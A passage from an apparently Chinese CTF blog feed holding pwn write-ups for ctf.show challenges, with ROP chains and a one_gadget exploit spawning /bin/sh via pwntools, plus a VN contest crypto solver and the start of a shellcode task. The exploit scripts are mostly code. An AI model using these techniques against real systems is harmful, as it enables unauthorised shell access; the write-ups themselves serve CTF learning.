pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0806f02a&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea064&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080b81c6&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080549db&#x27;</span>,<span class="number">16</span>)) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0806f02a&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea068&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x08049303&#x27;</span>,<span class="number">16</span>)) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080549db&#x27;</span>,<span class="number">16</span>)) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080481c9&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea060&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080de955&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea068&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0806f02a&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea068&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x08049303&#x27;</span>,<span class="number">16</span>)) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>))<span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0807a86f&#x27;</span>,<span class="number">16</span>)) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0806cc25&#x27;</span>,<span class="number">16</span>)) <span class="comment"># int 0x80</span></span><br><span class="line">io.sendline(p)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我自己写的但是没跑通，有师傅看到的话可以指点一下吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28118</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">pop_eax_ret=<span class="number">0x080b81c6</span></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806f050</span></span><br><span class="line">int_0x80=<span class="number">0x0806cc25</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0x3</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0x10</span>)+p32(bss)+p32(<span class="number">0</span>)+p32(int_0x80)</span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)+p32(int_0x80)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">bin_sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(bin_sh)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pwn74one-gadget"><a href="#pwn74one-gadget" class="headerlink" title="pwn74one_gadget"></a>pwn74one_gadget</h2><p>该题主要用于科普one_gadget，麻烦的点在于它没有给libc，群里又没找到，只有到libc database search上对着wp试</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>找到的libc是这个libc6_2.27-3ubuntu1.6_amd64.so<a href="https://libc.blukat.me/?q=printf:e40&l=libc6_2.27-3ubuntu1.6_amd64">libc database search</a></p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">2</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A80);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CA8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D40);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : PWN_Tricks                                              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Use one_gadget a shuttle!                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p ?\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v4);</span><br><span class="line">  v4[<span class="number">1</span>] = v4[<span class="number">0</span>];</span><br><span class="line">  (v4[<span class="number">0</span>])();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现会输出printf的地址可以用来找libc基地址</p><p>此处v4[0]，v4[1]绕来绕去的最后也不知道是调用哪的函数，直接选择看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000008F2 48 8D 45 E8                   lea     rax, [rbp+var_18]</span><br><span class="line">.text:00000000000008F6 48 89 C6                      mov     rsi, rax</span><br><span class="line">.text:00000000000008F9 48 8D 3D 41 06 00 00          lea     rdi, aLd                        ; &quot;%ld&quot;</span><br><span class="line">.text:0000000000000900 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000000905 E8 E6 FD FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0000000000000905</span><br><span class="line">.text:000000000000090A 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:000000000000090E 48 89 45 F0                   mov     [rbp+var_10], rax</span><br><span class="line">.text:0000000000000912 48 8B 55 F0                   mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000000916 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000091B FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>直接从call rdx反着往上看，call的地址就是我们输入的数据</p><p>查看one_gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">桌面$ one_gadget libc.so             </span><br><span class="line">/var/lib/gems/2.7.0/gems/one_gadget-1.7.3/lib/one_gadget/fetchers/base.rb:32: warning: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call</span><br><span class="line">/var/lib/gems/2.7.0/gems/one_gadget-1.7.3/lib/one_gadget/gadget.rb:27: warning: The called method `initialize<span class="string">&#x27; is defined here</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure><p>通过gdb调试可以发现，当运行到call rdx时rsp+0x70处的值为零，而rsp+0x40处不为零，故只要输入onegadget的地址0x10a2fc+libc_base作为[rbp+var_18]后续call该地址处的值时即可get shell</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28123</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a2fc</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">printf_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">io.sendline(<span class="built_in">str</span>(one_gadget + libc_base))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  %ld   要求输入的是一个长整型值的字符串表示故将地址转换成字符串形式使得能够正常读入。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VN wp</title>
      <link href="/2025/02/08/VNwp/"/>
      <url>/2025/02/08/VNwp/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h2><p>简单的签到题，原本以为真的要解密程序里的那个字符串结果发现记事本打开搜VN就有flag。</p><p><img src="/../images/VNwp/misc1.png" alt="1"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h2><p>AI神力，首先多项式求根求解多项式方程找到质数候选值，质数筛选，模运算计算平方根和模数，Tonelli-Shanke算法计算模数下的平方根，注意考虑平方根正负两种情况，接着用中国剩余定理将模质数下的解合并为模N下的解，最后过滤解码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入所需的库</span></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, solve, isprime</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义多项式字符串</span></span><br><span class="line">polynomial_str = <span class="string">&quot;x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619&quot;</span></span><br><span class="line"><span class="comment"># 定义常数 c</span></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义符号 x</span></span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算多项式表达式</span></span><br><span class="line">expr = <span class="built_in">eval</span>(polynomial_str)</span><br><span class="line"><span class="comment"># 求解多项式方程</span></span><br><span class="line">roots = solve(expr, x)</span><br><span class="line"><span class="comment"># 将根转换为整数并四舍五入</span></span><br><span class="line">p_candidates = [<span class="built_in">int</span>(root.<span class="built_in">round</span>()) <span class="keyword">for</span> root <span class="keyword">in</span> roots]  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化质数列表</span></span><br><span class="line">primes = []</span><br><span class="line"><span class="comment"># 遍历候选质数</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_candidates:</span><br><span class="line">    <span class="comment"># 检查是否为质数</span></span><br><span class="line">    <span class="keyword">if</span> isprime(p):</span><br><span class="line">        <span class="comment"># 将质数添加到列表中</span></span><br><span class="line">        primes.append(p)</span><br><span class="line"><span class="comment"># 对质数列表进行排序</span></span><br><span class="line">primes = <span class="built_in">sorted</span>(primes, reverse=<span class="literal">True</span>) </span><br><span class="line"><span class="comment"># 打印找到的质数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;找到的质数:&quot;</span>, primes)</span><br><span class="line"><span class="comment"># 提取三个最大的质数</span></span><br><span class="line">p0, p1, p2 = primes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 N</span></span><br><span class="line">N = p0 * p1 * p2</span><br><span class="line"><span class="comment"># 打印 N</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 c 小于 N</span></span><br><span class="line"><span class="keyword">assert</span> c &lt; N, <span class="string">&quot;c 的值超出模数范围&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 Tonelli-Shanks 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tonelli_shanks</span>(<span class="params">n, p</span>):</span><br><span class="line">    <span class="comment"># 检查 n 是否为二次剩余</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p) != <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 如果不是二次剩余，返回 None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line">    <span class="comment"># 计算平方根</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 c 在 p0 下的平方根</span></span><br><span class="line">r0 = tonelli_shanks(c, p0)</span><br><span class="line"><span class="comment"># 计算 c 在 p1 下的平方根</span></span><br><span class="line">r1 = tonelli_shanks(c, p1)</span><br><span class="line"><span class="comment"># 计算 c 在 p2 下的平方根</span></span><br><span class="line">r2 = tonelli_shanks(c, p2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 product 函数</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化解列表</span></span><br><span class="line">solutions = []</span><br><span class="line"><span class="comment"># 生成所有可能的符号组合</span></span><br><span class="line">signs = <span class="built_in">list</span>(product([+<span class="number">1</span>, -<span class="number">1</span>], repeat=<span class="number">3</span>))</span><br><span class="line"><span class="comment"># 遍历所有符号组合</span></span><br><span class="line"><span class="keyword">for</span> sign <span class="keyword">in</span> signs:</span><br><span class="line">    <span class="comment"># 计算 a0</span></span><br><span class="line">    a0 = (sign[<span class="number">0</span>] * r0) % p0</span><br><span class="line">    <span class="comment"># 计算 a1</span></span><br><span class="line">    a1 = (sign[<span class="number">1</span>] * r1) % p1</span><br><span class="line">    <span class="comment"># 计算 a2</span></span><br><span class="line">    a2 = (sign[<span class="number">2</span>] * r2) % p2</span><br><span class="line">    <span class="comment"># 将解添加到列表中</span></span><br><span class="line">    solutions.append((a0, a1, a2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模数列表</span></span><br><span class="line">moduli = [p0, p1, p2]</span><br><span class="line"><span class="comment"># 初始化可能的 flag 列表</span></span><br><span class="line">possible_flags = []</span><br><span class="line"><span class="comment"># 遍历所有解</span></span><br><span class="line"><span class="keyword">for</span> sol <span class="keyword">in</span> solutions:</span><br><span class="line">    <span class="comment"># 使用中国剩余定理求解</span></span><br><span class="line">    res = crt(moduli, sol)</span><br><span class="line">    <span class="comment"># 如果解存在</span></span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 将解添加到可能的 flag 列表中</span></span><br><span class="line">        possible_flags.append(res[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去重可能的 flag 列表</span></span><br><span class="line">possible_flags = <span class="built_in">list</span>(<span class="built_in">set</span>(possible_flags))</span><br><span class="line"><span class="comment"># 过滤可能的 flag 列表</span></span><br><span class="line">possible_flags = [f <span class="keyword">for</span> f <span class="keyword">in</span> possible_flags <span class="keyword">if</span> f**<span class="number">2</span> % N == c]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印可能的 flag 解密结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;可能的 flag 解密结果:&quot;</span>)</span><br><span class="line"><span class="comment"># 遍历所有可能的 flag</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> possible_flags:</span><br><span class="line">    <span class="comment"># 如果 flag 为负数</span></span><br><span class="line">    <span class="keyword">if</span> f &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 将 flag 转换为正数</span></span><br><span class="line">        f += N</span><br><span class="line">    <span class="comment"># 打印候选解</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;候选解: <span class="subst">&#123;f&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 尝试解码 flag</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将 flag 转换为字节数组</span></span><br><span class="line">        flag_bytes = <span class="built_in">int</span>.to_bytes(f, length=(f.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="comment"># 打印解码后的 flag</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解码后的 flag: <span class="subst">&#123;flag_bytes.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 如果解码失败</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 打印错误信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解码失败，可能非 ASCII 串&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/VNwp/%E5%AF%86%E7%A0%811.png" alt="1"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h2><p>这道题是一个典型的利用自定义可执行内存区域（通过<code>mmap</code>分配）执行Shellcode</p><p>checksec:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch: amd64-64-little </span><br><span class="line">RELRO: Full RELRO </span><br><span class="line">Stack: No canary found </span><br><span class="line">NX: NX enabled </span><br><span class="line">PIE: PIE 